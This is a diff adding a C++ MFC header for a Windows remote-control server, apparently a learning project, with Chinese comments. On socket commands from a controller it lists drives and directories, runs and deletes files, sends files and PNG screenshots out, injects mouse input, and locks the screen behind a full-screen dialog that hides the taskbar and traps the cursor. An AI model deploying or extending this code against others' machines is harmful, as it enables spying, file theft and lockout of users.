@@ -1,0 +1,459 @@
+#pragma once
+#include "Resource.h"
+#include <map>
+#include <atlimage.h>
+#include <direct.h>
+#include <stdio.h>
+#include <io.h>
+#include <list>
+#include "LockDialog.h"
+#include "ServerSocket.h"
+#include "CommonTool.h"
+
+#pragma warning(disable:4966)
+
+class CCommand
+{
+public: 
+	CCommand();
+	~CCommand() {}
+	int ExcuteCommand(int nCmd);
+
+protected:
+	typedef int(CCommand::* CMDFUNC)(); // 使用成员函数指针，解决switch case 语句过多的问题
+	std::map<int, CMDFUNC> m_mapFunction; // 从命令号到功能的映射
+
+	CLockDialog dlg;
+	unsigned threadid;
+
+protected:
+	static unsigned _stdcall threadLockDlg(void* arg)
+	{
+		
+		CCommand* thiz = (CCommand*)arg;
+
+		thiz->threadLockDlgMain();
+
+		_endthreadex(0);
+
+		return 0;
+	}
+
+	void threadLockDlgMain() {
+		TRACE("%s(%d):%d\r\n", __FUNCTION__, __LINE__, GetCurrentThreadId());
+		// 创建锁机提示框，非模态显示
+		dlg.Create(IDD_DIALOG_INFO, NULL);
+
+		dlg.ShowWindow(SW_SHOW);
+
+		// 弹窗全屏显示，遮蔽后台窗口
+		CRect rect;
+		rect.left = 0;
+		rect.top = 0;
+		rect.right = GetSystemMetrics(SM_CXFULLSCREEN); // w1
+		rect.bottom = GetSystemMetrics(SM_CYFULLSCREEN); // h1
+		rect.bottom = LONG(rect.bottom * 1.10);
+		dlg.MoveWindow(rect);
+
+		CWnd* pText = dlg.GetDlgItem(IDC_STATIC);
+		if (pText) {
+			CRect rtText;
+			pText->GetWindowRect(rtText);
+			int nWidth = rtText.Width();  // w0
+			int nHeight = rtText.Height(); // h0
+			int x = (rect.right - nWidth) / 2;
+			int y = (rect.bottom - nHeight) / 2;
+			dlg.MoveWindow(x, y, rtText.Width(), rtText.Height());
+		}
+
+		// 弹窗置顶
+		dlg.SetWindowPos(&dlg.wndTopMost, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE);
+
+		// 弹窗内的光标不显示
+		ShowCursor(false);
+		// 隐藏window任务栏
+		::ShowWindow(::FindWindow(_T("Shell_TrayWnd"), NULL), SW_HIDE);
+
+		// 限制鼠标活动范围在提示框内
+		rect.left = 0;
+		rect.top = 0;
+		rect.right = 1;
+		rect.bottom = 1;
+		ClipCursor(rect);
+
+		// MFC的消息循环
+		MSG msg;
+		while (GetMessage(&msg, NULL, 0, 0))
+		{
+			TranslateMessage(&msg);
+			DispatchMessage(&msg);
+
+			// 按下a键退出锁机弹窗
+			if (msg.message == WM_KEYDOWN) {
+				TRACE("msg:%08X wparam:%08X lparam:%08X\r\n", msg.message, msg.wParam, msg.lParam);
+				if (msg.wParam == 0x41) { // a: 0x41; esc: 0x1B
+					break;
+				}
+			}
+		}
+		// 恢复限制范围
+		ClipCursor(NULL);
+		// 恢复光标
+		ShowCursor(true);
+		// 恢复任务栏
+		::ShowWindow(::FindWindow(_T("Shell_TrayWnd"), NULL), SW_SHOW);
+
+		dlg.DestroyWindow();
+	}
+
+	// 获取磁盘信息，发送给控制端
+	int MakeDirverInfo(){
+		std::string result;
+		// 1==>A盘;2==>B盘;3==>C盘; .... 26==>Z盘
+		for (int i = 1; i <= 26; i++) {
+			if (_chdrive(i) == 0) {
+				if (result.size() > 0) {
+					result += ',';
+				}
+				result += 'A' + i - 1;
+			}
+		}
+
+		CPacket pack(1, (BYTE*)result.c_str(), result.size()); // 打包用的
+
+		CCommonTool::Dump((BYTE*)pack.Data(), pack.Size());
+		CServerSocket::getInstance()->Send(pack);
+
+		return 0;
+	}
+
+	// 获取目录
+	int MakeDirectoryInfo()
+	{
+		std::string strPath;
+
+		if (!CServerSocket::getInstance()->GetFilePath(strPath)) {
+			OutputDebugString(_T("当前的命令，不是获取文件列表，命令解析错误！！"));
+			return -1;
+		}
+
+		if (_chdir(strPath.c_str()) != 0) {
+			FILEINFO finfo;
+			finfo.hasNext = FALSE;
+			CPacket pack(2, (BYTE*)&finfo, sizeof(finfo));
+			CServerSocket::getInstance()->Send(pack);
+
+			OutputDebugString(_T("没有权限，访问目录！！"));
+			return -2;
+		}
+		strPath.append("\\*");
+
+		_finddata_t fdata;
+		intptr_t hfind = _findfirst(strPath.c_str(), &fdata);
+
+		if (hfind == -1) {
+			OutputDebugString(_T("没有找到任何文件！！"));
+			FILEINFO finfo;
+			finfo.hasNext = false;
+			CPacket pack(2, (BYTE*)&finfo, sizeof(finfo)); // 发送信息到控制端
+			CServerSocket::getInstance()->Send(pack);
+			return -3;
+		}
+
+		do {
+			FILEINFO finfo;
+			finfo.isDirectory = (fdata.attrib & _A_SUBDIR) != 0;
+			memcpy(finfo.szFileName, fdata.name, strlen(fdata.name));
+			CPacket pack(2, (BYTE*)&finfo, sizeof(finfo)); // 发送信息到控制端
+			CServerSocket::getInstance()->Send(pack);
+			// TRACE("Server send file name is: %s %d \r\n", finfo.szFileName, finfo.hasNext);
+		} while (_findnext(hfind, &fdata) == 0);
+
+		_findclose(hfind);
+
+		FILEINFO finfo;
+		finfo.hasNext = false;
+		CPacket pack(2, (BYTE*)&finfo, sizeof(finfo));
+		CServerSocket::getInstance()->Send(pack);
+		return 0;
+	}
+
+	// 打开文件
+	int RunFile()
+	{
+		std::string strPath;
+		CServerSocket::getInstance()->GetFilePath(strPath);
+
+		ShellExecuteA(NULL, NULL, strPath.c_str(), NULL, NULL, SW_SHOWNORMAL);
+
+		CPacket pack(3, NULL, 0); // 发送信息到控制端
+		CServerSocket::getInstance()->Send(pack);
+
+		return 0;
+	}
+
+	// 下载文件(发送文件到控制端)
+	int DownloadFile()
+	{
+		std::string strPath;
+		CServerSocket::getInstance()->GetFilePath(strPath);
+		long long data = 0;
+
+		FILE* pFile = NULL;
+		errno_t err = fopen_s(&pFile, strPath.c_str(), "rb");
+		if (err != 0) {
+			CPacket pack(4, (BYTE*)&data, 8);
+			CServerSocket::getInstance()->Send(pack);
+			return -1;
+		}
+
+		if (pFile != NULL) {
+			// 发送文件之前，先发送文件长度
+			fseek(pFile, 0, SEEK_END);
+			data = _ftelli64(pFile);
+			CPacket head(4, (BYTE*)&data, 8);
+			CServerSocket::getInstance()->Send(head);
+			fseek(pFile, 0, SEEK_SET);
+
+			char buffer[1024] = "";
+			size_t rlen = 0;
+			do
+			{
+				rlen = fread(buffer, 1, 1024, pFile);
+				CPacket pack(4, (BYTE*)buffer, rlen);
+				CServerSocket::getInstance()->Send(pack);
+			} while (rlen >= 1024);
+
+			fclose(pFile);
+		}
+
+		// 发一个空的，控制端就知道是结尾了
+		CPacket pack(4, NULL, 0);
+		CServerSocket::getInstance()->Send(pack);
+
+		return 0;
+	}
+
+	// 实现鼠标事件
+	int MouseEvent()
+	{
+		MOUSEEV mouse;
+		if (CServerSocket::getInstance()->GetMouseEvent(mouse)) {
+
+			DWORD nFlags = 0;
+
+			switch (mouse.nButton) // 按键类型
+			{
+			case 0: // 左键
+				nFlags = 0x01;
+				break;
+
+			case 1: // 右键
+				nFlags = 0x02;
+				break;
+
+			case 2: // 中键
+				nFlags = 0x04;
+				break;
+
+			case 3: // 没有按键
+				nFlags = 0x08;
+				break;
+
+			default:
+				break;
+			}
+
+			if (nFlags != 8) SetCursorPos(mouse.ptXY.x, mouse.ptXY.y);
+
+			switch (mouse.nAction) // 操作类型
+			{
+			case 0: // 单击
+				nFlags |= 0x10;
+				break;
+
+			case 1: // 双击
+				nFlags |= 0x20;
+				break;
+
+			case 2: // 按下
+				nFlags |= 0x40;
+				break;
+
+			case 3: // 放开
+				nFlags |= 0x80;
+				break;
+
+			default:
+				break;
+			}
+			TRACE("mouse event: %08X x=%d y=%d\r\n", nFlags, mouse.ptXY.x, mouse.ptXY.y);
+			// 组合类型
+			switch (nFlags) {
+			case 0x21: // 左键双击
+				mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, GetMessageExtraInfo());
+				mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, GetMessageExtraInfo());
+			case 0x11: // 左键单击
+				mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, GetMessageExtraInfo());
+				mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, GetMessageExtraInfo());
+				break;
+			case 0x41: // 左键按下
+				mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, GetMessageExtraInfo());
+				break;
+			case 0x81: // 左键放开
+				mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, GetMessageExtraInfo());
+				break;
+
+			case 0x22: // 右键双击
+				mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, GetMessageExtraInfo());
+				mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, GetMessageExtraInfo());
+			case 0x12: // 右键单击
+				mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, GetMessageExtraInfo());
+				mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, GetMessageExtraInfo());
+				break;
+			case 0x42: // 右键按下
+				mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, GetMessageExtraInfo());
+				break;
+			case 0x82: // 右键放开
+				mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, GetMessageExtraInfo());
+				break;
+
+			case 0x24: // 中键双击
+				mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, GetMessageExtraInfo());
+				mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, GetMessageExtraInfo());
+			case 0x14: // 中键单击
+				mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, GetMessageExtraInfo());
+				mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, GetMessageExtraInfo());
+				break;
+			case 0x44: // 中键按下
+				mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, GetMessageExtraInfo());
+				break;
+			case 0x84: // 中键放开
+				mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, GetMessageExtraInfo());
+				break;
+
+			case 0x08: // 单纯的鼠标移动
+				mouse_event(MOUSEEVENTF_MOVE, mouse.ptXY.x, mouse.ptXY.y, 0, GetMessageExtraInfo());
+				break;
+
+			default:
+				break;
+			}
+
+			CPacket pack(4, NULL, 0);
+			CServerSocket::getInstance()->Send(pack);
+		}
+		else {
+			OutputDebugString(_T("获取鼠标操作参数失败！！"));
+			return -1;
+		}
+		return 0;
+	}
+
+	// 发送屏幕截图
+	int SendScreen()
+	{
+		CImage screen; // GDI
+
+		HDC hScreen = ::GetDC(NULL);
+		int nBitPerPixel = GetDeviceCaps(hScreen, BITSPIXEL); // ARGB8888 32bit; RGB888 24bit; 
+		int nWidth = GetDeviceCaps(hScreen, HORZRES);
+		int nHeight = GetDeviceCaps(hScreen, VERTRES);
+
+		screen.Create(nWidth, nHeight, nBitPerPixel);
+		BitBlt(screen.GetDC(), 0, 0, nWidth, nHeight, hScreen, 0, 0, SRCCOPY); // 2240 * 1400分辨率
+
+		ReleaseDC(NULL, hScreen);
+
+		// DWORD tick = GetTickCount64();
+
+		HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, 0);
+		if (hMem == NULL) return -1;
+
+		IStream* pStream = NULL;
+
+		HRESULT ret = CreateStreamOnHGlobal(hMem, TRUE, &pStream);
+
+		if (ret == S_OK) {
+			screen.Save(pStream, Gdiplus::ImageFormatPNG);
+
+			LARGE_INTEGER bg = { 0 };
+			pStream->Seek(bg, STREAM_SEEK_SET, NULL);
+			PBYTE pData = (PBYTE)GlobalLock(hMem);
+			SIZE_T nSize = GlobalSize(hMem);
+
+			CPacket pack(6, pData, nSize);
+			CServerSocket::getInstance()->Send(pack);
+
+			GlobalUnlock(hMem);
+
+		}
+
+		/*
+		screen.Save(_T("test2024.png"), Gdiplus::ImageFormatPNG);
+		TRACE("png %d\r\n", GetTickCount64() - tick);
+
+		tick = GetTickCount64();
+		screen.Save(_T("test2024.jpg"), Gdiplus::ImageFormatJPEG);
+		TRACE("jpg %d\r\n", GetTickCount64() - tick);
+		*/
+
+		pStream->Release();
+		GlobalFree(hMem);
+		screen.ReleaseDC();
+
+		return 0;
+	}
+
+	int LockMachine()
+	{
+		if (dlg.m_hWnd == NULL || dlg.m_hWnd == INVALID_HANDLE_VALUE) {
+			// 使用线程处理，防止在显示弹窗的死循环中出不来，接收不到后续指令
+			// _beginthread(threadLockDlg, 0, NULL);
+			_beginthreadex(NULL, 0, &CCommand::threadLockDlg, this, 0, &threadid);
+			TRACE("threadid = %d\r\n", threadid);
+		}
+		CPacket pack(7, NULL, 0);
+		CServerSocket::getInstance()->Send(pack);
+		return 0;
+	}
+
+	int UnlockMachine()
+	{
+		PostThreadMessage(threadid, WM_KEYDOWN, 0x41, 0);
+		CPacket pack(8, NULL, 0);
+		CServerSocket::getInstance()->Send(pack);
+		return 0;
+	}
+
+	int TestConnect()
+	{
+		CPacket pack(1981, NULL, 0);
+
+		bool ret = CServerSocket::getInstance()->Send(pack);
+
+		TRACE("Send ret = %d\r\n", ret);
+
+		return 0;
+	}
+
+	int DeleteLocalFile()
+	{
+		std::string strPath;
+		CServerSocket::getInstance()->GetFilePath(strPath);
+		TCHAR sPath[MAX_PATH] = _T("");
+
+		// mbstowcs(sPath, strPath.c_str(), strPath.size()); // 使用这种方式，中文容易乱码
+		MultiByteToWideChar(CP_ACP, 0, strPath.c_str(), strPath.size(),
+			sPath, sizeof(sPath) / sizeof(TCHAR)); // 936:活动代码页
+
+		DeleteFileA(strPath.c_str());
+
+		CPacket pack(9, NULL, 0);
+		bool ret = CServerSocket::getInstance()->Send(pack);
+		TRACE("Send ret = %d\r\n", ret);
+		return 0;
+	}
+
+};
+
